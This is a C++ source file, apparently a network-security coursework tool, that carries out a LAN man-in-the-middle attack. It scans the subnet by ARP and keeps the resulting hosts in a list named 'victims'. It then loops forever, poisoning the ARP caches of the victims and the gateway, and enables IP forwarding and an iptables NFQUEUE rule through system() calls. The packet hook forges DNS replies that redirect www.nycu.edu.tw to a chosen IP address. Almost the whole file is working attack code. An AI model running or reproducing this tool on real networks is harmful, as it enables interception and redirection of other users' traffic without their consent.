#include <iostream>
#include <string>
#include <vector>
#include <utility>
#include <cstring>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <linux/if_packet.h>
#include <netinet/ip.h> 
#include <arpa/inet.h>
#include <string>
#include <cstring>
#include <iomanip>
#include <sys/select.h> 
#include <fstream>
#include <sstream>
#include <array>
#include <algorithm> 
#include <thread> 
#include <chrono> 
#include <regex> // Added for regular expressions
#include <cstdlib> // Added for system calls
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <unordered_map>
#include <csignal>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>



#define ETHER_HEADER_SIZE sizeof(struct ether_header)
#define ARP_HEADER_SIZE sizeof(struct ether_arp)
#define ETHER_TYPE_ARP 0x0806
#define ETHER_HW_TYPE 0x0001
#define ETHER_PROTO_TYPE_IPv4 0x0800
#define ETHER_HW_SIZE 6
#define ETHER_PROTO_SIZE 4
#define ARP_REQUEST 1
#define MAX_PACKET_SIZE 2048

std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> victims;

uint8_t local_mac[6]; // Your MAC address
uint8_t local_ip[4]; // Your IP address
uint8_t gateway_mac[6];
char* interface_name;

struct DNSHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

struct DNSResourceRecord {
    uint16_t name;      // Offset pointer to domain name in DNS packet
    uint16_t type;      // Type of the resource record (e.g., A, MX, CNAME, etc.)
    uint16_t class_;    // Class of the resource record (typically IN for Internet)
    uint32_t ttl;       // Time to Live: the number of seconds the answer can be cached
    uint16_t rdlength;  // Length of the RDATA field
    uint8_t rdata[4];   // Assuming IPv4 address for this example
};

uint16_t calculateIPChecksum(const struct iphdr* ipHeader) {
    uint32_t sum = 0;
    const uint16_t* words = reinterpret_cast<const uint16_t*>(ipHeader);
    int length = ipHeader->ihl * 2; // Length of the IP header in 16-bit words

    // Sum up all 16-bit words in the IP header
    for (int i = 0; i < length; ++i) {
        sum += ntohs(words[i]);
    }

    // Fold the carry bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    // Take the one's complement
    return ~sum;
}

uint16_t calculateUDPChecksum(const struct iphdr* ipHeader, const struct udphdr* udpHeader, const uint8_t* payload, size_t payloadLength) {
    uint32_t sum = 0;

    // Pseudo-header: Source IP address
    sum += (ipHeader->saddr >> 16) & 0xFFFF;
    sum += ipHeader->saddr & 0xFFFF;

    // Pseudo-header: Destination IP address
    sum += (ipHeader->daddr >> 16) & 0xFFFF;
    sum += ipHeader->daddr & 0xFFFF;

    // Pseudo-header: Protocol (UDP)
    sum += htons(IPPROTO_UDP);

    // Pseudo-header: UDP length (includes header and data)
    sum += udpHeader->len;

    // Sum up the UDP header and data (payload) as 16-bit words
    const uint16_t* words = reinterpret_cast<const uint16_t*>(udpHeader);
    int length = (payloadLength+8) / 2;

    for (int i = 0; i < length; ++i) {
        sum += words[i];
    }

    // If payload length is odd, add the last byte as a padding byte
    if (payloadLength % 2 != 0) {
        uint16_t lastWord = static_cast<uint16_t>(payload[payloadLength - 1]);
        sum += lastWord;
    }

    // Fold the carry bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    // Take the one's complement
    uint16_t checksum = ~sum;

    return checksum;
}

static int modify_packet(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                         struct nfq_data *nfa, void *data) {
    //std::cout<<"in modify\n";
    int id = 0;
    struct nfqnl_msg_packet_hdr *ph;
    unsigned char *pkt_data;
    int len = nfq_get_payload(nfa, &pkt_data);
    char pkt_data_ascii[len];

    for (int i = 0; i < len; ++i)
    {
        // Print printable characters as is, otherwise print a dot
        if (isprint(pkt_data[i]))
        {
            //std::cout << pkt_data[i];
            pkt_data_ascii[i]=pkt_data[i];
        }
        else
        {
            //std::cout << ".";
            pkt_data_ascii[i]='.';
        }
    }
    //std::cout<<std::endl;

    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) {
        id = ntohl(ph->packet_id);
    }

    struct iphdr *ip_header = (struct iphdr*)(pkt_data);
    char src_ip[INET_ADDRSTRLEN];
    char dst_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(ip_header->saddr), src_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(ip_header->daddr), dst_ip, INET_ADDRSTRLEN);

    struct udphdr *udp_header = (struct udphdr*)(pkt_data + sizeof(struct iphdr));
    int udp_payload_len = ntohs(udp_header->len) - sizeof(struct udphdr);
    unsigned char *udp_payload = pkt_data + sizeof(struct iphdr) + sizeof(struct udphdr);


    if (char* nycu_tw=strstr(pkt_data_ascii, "www.nycu.edu.tw")) {
        nycu_tw+=strlen("www.nycu.edu.tw")+2;
        int tw_offset=nycu_tw-pkt_data_ascii;
        DNSHeader *dnsHeader = (DNSHeader *)udp_payload;
        if(dnsHeader->flags==htons(0x0100)){
        // Assuming DNS data is in network byte orde
            dnsHeader->flags = htons(0x8180);
            dnsHeader->ancount=htons(1);
            

            // Convert source and destination MAC addresses to human-readable strings
            //std::cout << "Source IP: " << src_ip << std::endl;
            //std::cout << "Destination IP: " << dst_ip << std::endl;
            
            //std::cout << "Packet data (ASCII): ";
            //std::cout<<pkt_data_ascii<<std::endl;
            //std::cout << "[*] NYCU is redirecting to 140.113.24.241..." << std::endl;

            uint32_t temp_addr = ip_header->saddr;
            ip_header->saddr = ip_header->daddr;
            ip_header->daddr =temp_addr;


            uint16_t temp_port =udp_header->source;
            udp_header->source=udp_header->dest;
            udp_header->dest=temp_port;

            uint16_t originalLength = ntohs(ip_header->tot_len);
            uint16_t newLength = originalLength + 16;

            ip_header->tot_len = htons(newLength);
            originalLength = ntohs(udp_header->len);
            newLength = originalLength + 16;
            udp_header->len = htons(newLength);


            uint8_t addition[11];
            for(int i=0;i<11;i++){
                addition[i]=pkt_data[len-11+i];
            }
            addition[8]=0x05;
            addition[3]=0x10;

            DNSResourceRecord answer;
            answer.name = htons(0xC00C); 
            answer.type = htons(0x0001); 
            answer.class_ = htons(0x0001);
            answer.ttl = htons(0x00000005);
            answer.rdlength = htons(0x0004);
            inet_pton(AF_INET, "140.113.24.241", &(answer.rdata));
            ip_header->check=0;
            uint16_t checksum = calculateIPChecksum(ip_header);
            ip_header->check = ntohs(checksum);
            
            uint8_t temp_arr[6]={0x00,0x04,0x8c,0x71,0x18,0xf1};
            memcpy(pkt_data+len-11, &answer, 10);
            memcpy(pkt_data+len-1,&temp_arr,6);
            
            memcpy(pkt_data+len-11+16, &addition, 11);

            udp_header->check=0;
            uint16_t udpChecksumAfter = calculateUDPChecksum(reinterpret_cast<struct iphdr*>(pkt_data),
                                                        reinterpret_cast<struct udphdr*>(pkt_data + sizeof(struct iphdr)),
                                                        pkt_data + sizeof(struct iphdr) + sizeof(struct udphdr),
                                                        len - sizeof(struct iphdr) - sizeof(struct udphdr)+16);
            udp_header->check=ntohl(udpChecksumAfter);
            

            
            return nfq_set_verdict(qh, id, NF_ACCEPT, len+16, pkt_data);

            //nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
            //return 0;
        }
    }
    

     

    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
}

void processEthernetFrame(uint8_t* frame, size_t frame_len) {

    
    if (frame_len < ETHER_HEADER_SIZE) {
        std::cerr << "Invalid Ethernet frame" << std::endl;
        return;
    }

    struct ether_header* eth_hdr = reinterpret_cast<struct ether_header*>(frame);
    uint8_t* src_mac = eth_hdr->ether_shost;
    uint8_t* dst_mac = eth_hdr->ether_dhost;

    char src_mac_str[18];
    char dst_mac_str[18];
    sprintf(src_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
    sprintf(dst_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);

    // Print source and destination MAC addresses

    if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {
        // Extract the IP header
        struct iphdr* ip_hdr = reinterpret_cast<struct iphdr*>(frame + ETHER_HEADER_SIZE);

        if (ip_hdr->protocol == IPPROTO_UDP) {
            struct udphdr *udp_header = reinterpret_cast<struct udphdr*>(frame + ETHER_HEADER_SIZE + ip_hdr->ihl * 4);

            if (ntohs(udp_header->dest) == 53) { // DNS port
                size_t udp_header_size = sizeof(struct udphdr);
                size_t dns_payload_len = frame_len - ETHER_HEADER_SIZE - ip_hdr->ihl * 4 - udp_header_size;
                uint8_t* dns_payload = frame + ETHER_HEADER_SIZE + ip_hdr->ihl * 4 + udp_header_size;
                std::string payloadStr(reinterpret_cast<char*>(dns_payload), dns_payload_len);
                //std::cout<<"DNS:"<<payloadStr<<std::endl;
                std::string substrings[] = {"www","nycu", "edu", "tw"};

                // Initialize the starting position for each substring search
                size_t startPos = 0;

                // Iterate through each substring
                bool foundSequence = true;
                for (const auto& substr : substrings) {
                    // Search for the substring
                    size_t pos = payloadStr.find(substr, startPos);
                    if (pos == std::string::npos) {
                        // Substring not found
                        foundSequence = false;
                        break;
                    }
                    // Update the starting position for the next search
                    startPos = pos + substr.length()-1;
                }
                if(foundSequence){
                    std::cout<<"DNS:"<<payloadStr<<std::endl;
                    std::cout<<"turn www.nycu.edu.tw into 140.113\n";
                }

            }
        }
        

        // Convert source and destination IP addresses to human-readable strings
        char src_ip_str[INET_ADDRSTRLEN];
        char dst_ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(ip_hdr->saddr), src_ip_str, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &(ip_hdr->daddr), dst_ip_str, INET_ADDRSTRLEN);

        bool is_dst_mac_local = true;
        for (int i = 0; i < ETHER_ADDR_LEN; ++i) {
            if (dst_mac[i] != local_mac[i]) {
                is_dst_mac_local = false;
                break;
            }
        }


        // Print source and destination IP addresses
        if (strcmp(dst_ip_str, inet_ntoa(*(struct in_addr*)local_ip)) != 0 && is_dst_mac_local) {
            
            uint8_t* new_frame = new uint8_t[frame_len];
            std::memcpy(new_frame, frame, frame_len);
            struct ether_header* new_eth_hdr = reinterpret_cast<struct ether_header*>(new_frame);
            std::memcpy(new_eth_hdr->ether_shost, local_mac, ETHER_ADDR_LEN);
            
            std::memcpy(new_eth_hdr->ether_dhost, gateway_mac, ETHER_ADDR_LEN);
            for (const auto& victim : victims) {
                uint8_t victim_ip[4] = {victim.first[0],victim.first[1],victim.first[2],victim.first[3]};
                if (strcmp(dst_ip_str, inet_ntoa(*(struct in_addr*)victim_ip))==0) {
                    std::memcpy(new_eth_hdr->ether_dhost, victim.second.data(), ETHER_ADDR_LEN);
                    break;
                }
            }

            int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
            if (sockfd < 0) {
                perror("Socket creation failed");
                return;
            }

            // Send the new packet over the network
            struct sockaddr_ll device;
            memset(&device, 0, sizeof(device));
            device.sll_ifindex = if_nametoindex(interface_name);
            sendto(sockfd, new_frame, frame_len, 0, (struct sockaddr*)&device, sizeof(device));

            // Close the socket
            close(sockfd);
            delete[] new_frame;

        }
    }
}

void receivePackets(int sockfd) {
    struct nfq_handle *h = nfq_open();
    if (!h) {
        std::cerr << "Error in nfq_open()" << std::endl;
        return;
    }

    /*if (nfq_unbind_pf(h, AF_INET) < 0) {
        std::cerr << "Error in nfq_unbind_pf()" << std::endl;
        nfq_close(h);
        return;
    }

    if (nfq_bind_pf(h, AF_INET) < 0) {
        std::cerr << "Error in nfq_bind_pf()" << std::endl;
        nfq_close(h);
        return;
    }*/

    struct nfq_q_handle *qh = nfq_create_queue(h, 0, &modify_packet, nullptr);
    if (!qh) {
        std::cerr << "Error in nfq_create_queue()" << std::endl;
        nfq_close(h);
        return;
    }

    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, MAX_PACKET_SIZE) < 0) {
        std::cerr << "Can't set packet_copy mode" << std::endl;
        nfq_destroy_queue(qh);
        nfq_close(h);
        return;
    }

    int fd = nfq_fd(h);
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    while (true) {
        //std::cout<<"in while\n"<<std::endl;
        // Receive the Ethernet frame into a buffer
        uint8_t buffer[2048];
        ssize_t bytes_received = recv(fd, buffer, sizeof(buffer), 0);
        if (bytes_received < 0) {
            perror("Error receiving packet");
        } else if (bytes_received >= ETHER_HEADER_SIZE) {
            // Process the received Ethernet frame
            //processEthernetFrame(buffer, bytes_received);
            nfq_handle_packet(h, reinterpret_cast<char*>(buffer), sizeof(buffer));
        }
    }
}


std::vector<uint8_t> ipStringToUint8Array(const std::string& ip) {
    std::vector<uint8_t> result;
    std::stringstream ss(ip);
    std::string octet;
    
    while (std::getline(ss, octet, '.')) {
        try {
            // Convert octet string to uint8_t and push into result vector
            result.push_back(static_cast<uint8_t>(std::stoi(octet)));
        } catch (const std::invalid_argument& e) {
            std::cerr << "Invalid IP address format: " << e.what() << std::endl;
            result.clear();
            break;
        } catch (const std::out_of_range& e) {
            std::cerr << "Out of range error: " << e.what() << std::endl;
            result.clear();
            break;
        }
    }
    
    // Check if we got exactly 4 octets
    if (result.size() != 4) {
        std::cerr << "Invalid IP address format: " << ip << std::endl;
        result.clear();
    }
    
    return result;
}

std::pair<uint8_t*, uint8_t*> getOwnAddress(const std::string& interface_name) {
    uint8_t* own_ip_bytes = new uint8_t[4];
    std::fill(own_ip_bytes, own_ip_bytes + 4, 0);

    uint8_t* own_mac_bytes = new uint8_t[6];
    std::fill(own_mac_bytes, own_mac_bytes + 6, 0);

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd == -1) {
        std::cerr << "Failed to open socket" << std::endl;
        return std::make_pair(own_ip_bytes, own_mac_bytes);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ);

    // Get IP address
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        std::cerr << "Failed to get interface address" << std::endl;
        close(sockfd);
        return std::make_pair(own_ip_bytes, own_mac_bytes);
    }
    struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    uint32_t ip = addr->sin_addr.s_addr;
    memcpy(own_ip_bytes, &ip, 4);

    // Get MAC address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        std::cerr << "Failed to get hardware address" << std::endl;
        close(sockfd);
        return std::make_pair(own_ip_bytes, own_mac_bytes);
    }
    unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);
    memcpy(own_mac_bytes, mac, 6);

    close(sockfd);
    return std::make_pair(own_ip_bytes, own_mac_bytes);
}

std::string getDefaultGateway() {
    std::string line;
    std::ifstream file("/proc/net/route");

    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string iface, dest, gateway, flags, refcnt, use, metric, mask, mtu, window, irtt;
        
        if (!(iss >> iface >> dest >> gateway >> flags >> refcnt >> use >> metric >> mask >> mtu >> window >> irtt)) {
            continue;
        }
        
        if (iface == "0" || dest != "00000000" || gateway == "00000000") {
            continue;
        }
        
        // Convert hexadecimal gateway IP to dotted decimal notation
        unsigned long gw;
        std::istringstream(gateway) >> std::hex >> gw;
        struct in_addr addr;
        addr.s_addr = gw;
        return inet_ntoa(addr);
    }

    return "Unknown";
}

void craft_ARP_packet(uint8_t* packet, const uint8_t* src_mac, const uint8_t* src_ip, const uint8_t* dst_mac,const uint8_t* dst_ip) {
    struct ether_header* eth_hdr = (struct ether_header*)packet;
    struct ether_arp* arp_hdr = (struct ether_arp*)(packet + ETHER_HEADER_SIZE);

    // Ethernet header
    memcpy(eth_hdr->ether_shost, src_mac, ETHER_ADDR_LEN);
    memcpy(eth_hdr->ether_dhost, dst_mac, ETHER_ADDR_LEN); 
    eth_hdr->ether_type = htons(ETHER_TYPE_ARP);

    // ARP header
    arp_hdr->arp_hrd = htons(ETHER_HW_TYPE);
    arp_hdr->arp_pro = htons(ETHER_PROTO_TYPE_IPv4);
    arp_hdr->arp_hln = ETHER_HW_SIZE;
    arp_hdr->arp_pln = ETHER_PROTO_SIZE;
    arp_hdr->arp_op = htons(ARP_REQUEST);
    memcpy(arp_hdr->arp_sha, src_mac, ETHER_ADDR_LEN);
    memcpy(arp_hdr->arp_spa, src_ip, sizeof(struct in_addr));
    memcpy(arp_hdr->arp_tha, dst_mac, ETHER_ADDR_LEN); // Zero out target MAC
    memcpy(arp_hdr->arp_tpa, dst_ip, sizeof(struct in_addr));
}

void send_ARP_packet(int sockfd, uint8_t* packet, size_t packet_len, const char* interface) {
    struct sockaddr_ll device;
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(interface);
    sendto(sockfd, packet, packet_len, 0, (struct sockaddr*)&device, sizeof(device));
}

std::pair<uint8_t*, uint8_t*> process_ARP_response(uint8_t* packet) {
    struct ether_header* eth_hdr = (struct ether_header*)packet;
    struct ether_arp* arp_hdr = (struct ether_arp*)(packet + ETHER_HEADER_SIZE);

    if (ntohs(eth_hdr->ether_type) == ETHER_TYPE_ARP && ntohs(arp_hdr->arp_op) == ARPOP_REPLY) {
        // Extract IP and MAC addresses from ARP response
        uint8_t* src_mac = arp_hdr->arp_sha;
        uint8_t* src_ip = arp_hdr->arp_spa;
        
        std::string gateway = getDefaultGateway();
        char source_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &arp_hdr->arp_spa, source_ip, INET_ADDRSTRLEN);
        std::string source_ip_str = source_ip;
        if (source_ip_str != gateway) {
            char source_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &arp_hdr->arp_spa, source_ip, INET_ADDRSTRLEN);
            std::cout<<source_ip;
            std::cout << "\t\t";
            for (int i = 0; i < ETHER_ADDR_LEN; ++i) {
                std::cout << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)src_mac[i];
                if (i < ETHER_ADDR_LEN - 1) std::cout << ":";
            }
            std::cout << std::endl;
        }
        return std::make_pair(src_ip, src_mac);
    }

    // Return empty strings if no valid ARP response
    return std::make_pair(nullptr, nullptr);
}


void spoofing(const std::string& interface, const uint8_t* local_mac, const uint8_t* target_mac, const uint8_t* target_ip, const uint8_t* spoof_ip) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    uint8_t packet[ETHER_HEADER_SIZE + ARP_HEADER_SIZE]; // ARP packet size

    // Craft ARP packet
    craft_ARP_packet(packet, local_mac, spoof_ip, target_mac,target_ip);

    // Send ARP reply packet
    send_ARP_packet(sockfd, packet, sizeof(packet), interface.c_str());

    close(sockfd);
}


int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <interface>" << std::endl;
        return 1;
    }

    interface_name = argv[1];

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward");
    //system("iptables -A INPUT  -j NFQUEUE");
    system("iptables -A FORWARD   -j NFQUEUE");
    //system("iptables -A OUTPUT   -j NFQUEUE");
    

    std::string gateway_str = getDefaultGateway();
    std::vector<uint8_t> gateway=ipStringToUint8Array(gateway_str);
    std::pair<uint8_t*, uint8_t*> addresses = getOwnAddress(interface_name);
    //uint8_t src_mac[6]; // Your MAC address
    //uint8_t src_ip[4]; // Your IP address
    
    if (addresses.first && addresses.second) {
        // Print the IP address

        for(int i=0;i<4;i++){
            local_ip[i]=addresses.first[i];
        }

        // Print the MAC address
        for (int i = 0; i < 6; ++i) {
            local_mac[i]=addresses.second[i];
        }

        // Free the allocated memory
    } else {
        std::cerr << "Failed to get own address" << std::endl;
    }

    // Craft ARP packet
    delete[] addresses.first;
    delete[] addresses.second;


    uint8_t packet[ETHER_HEADER_SIZE + ARP_HEADER_SIZE]; // ARP packet size
    std::cout << "Available devices:" << std::endl;
    std::cout << "----------------------------------------------" << std::endl;
    std::cout << "IP" << std::string(22, ' ')  << "MAC" << std::endl;
    std::cout << "----------------------------------------------" << std::endl;

    
    // Receive and process ARP responses
    for (uint8_t i=1;i<=254;i++) {
        uint8_t dst_ip[4] = {local_ip[0], local_ip[1], local_ip[2], i}; // Network gateway IP
        uint8_t dst_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; 
        craft_ARP_packet(packet, local_mac, local_ip, dst_mac,dst_ip);
        send_ARP_packet(sockfd, packet, sizeof(packet), interface_name); 
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sockfd, &readfds);

        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 500;
        uint8_t buffer[2048];

        int ready = select(sockfd + 1, &readfds, nullptr, nullptr, &timeout);
        if (ready == -1) {
            perror("select() failed");
            close(sockfd);
            return 1;
        } else if (ready == 0) {
            //std::cout << "Timeout occurred. No ARP responses received." << std::endl;
        } else {
            if (FD_ISSET(sockfd, &readfds)) {
                uint8_t buffer[2048];
                ssize_t bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);
                if (bytes_received < 0) {
                    perror("Error receiving packet");
                } else if (bytes_received >= ETHER_HEADER_SIZE) {
                    std::pair<uint8_t*, uint8_t*> victim=process_ARP_response(buffer);
                    std::array<uint8_t, 4> victim_ip;
                    std::array<uint8_t, 6> victim_mac;
                    if (victim.first && victim.second) {
                        // Assuming victim.first and victim.second point to valid memory locations
                        std::copy(victim.first, victim.first + 4, victim_ip.begin());
                        std::copy(victim.second, victim.second + 6, victim_mac.begin());
                        if (std::vector<uint8_t>(victim_ip.begin(), victim_ip.end()) == gateway) {
                            for(int j=0;j<6;j++){
                                gateway_mac[j]=victim_mac[j];
                            }
                        }
                        victims.push_back(std::make_pair(victim_ip, victim_mac));
                    }
                            
                }
            }
        }
    }

    std::thread receiveThread(receivePackets, sockfd);
    //std::thread t1(interceptSSL);
    


    while(1){
        for (const auto& victim : victims) {
            
            if (std::vector<uint8_t>(victim.first.begin(), victim.first.end()) != gateway) {
                spoofing(interface_name, local_mac, victim.second.data(), victim.first.data(), gateway.data());
                spoofing(interface_name, local_mac, gateway_mac, gateway.data(), victim.first.data());
                
            }
            
        }

    }

    receiveThread.join();
    //t1.join();
    

    close(sockfd);
    return 0;
}
